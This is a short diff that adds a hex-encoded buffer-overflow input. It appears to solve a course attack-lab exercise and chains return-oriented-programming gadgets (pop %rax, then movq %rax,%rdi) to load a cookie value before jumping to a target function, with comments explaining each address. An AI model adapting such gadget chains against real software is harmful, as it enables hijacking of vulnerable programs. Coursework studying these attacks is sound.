@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* jump to 0x4019ab, which has 58 90 c3, pop %rax */
+fa 97 b9 59 00 00 00 00 /* the cookie value is being poped into %rax */
+c5 19 40 00 00 00 00 00 /* jump to 0x4019c5, which has 48 89 c7 90 c3, movq %rax, %rdi */
+ec 17 40 00 00 00 00 00 /* the alternate address to jump to */
